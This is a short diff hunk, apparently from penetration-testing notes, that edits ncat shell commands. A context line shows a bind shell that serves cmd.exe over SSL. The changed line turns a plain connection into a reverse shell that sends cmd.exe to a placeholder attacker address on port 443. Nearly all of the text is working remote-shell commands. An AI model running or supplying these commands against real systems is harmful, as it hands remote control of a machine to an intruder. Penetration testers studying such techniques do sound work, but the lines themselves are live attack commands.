@@ -67,5 +67,5 @@ ncat -lvp 4445 -e cmd.exe --allow <ATTACKIP> --ssl
 To do this even more safely, use a reverse shell 
 
 ~~~
-ncat -v <attackIP> 443 --ssl
+ncat -v <attackIP> 443 -e cmd.exe --ssl
 ~~~
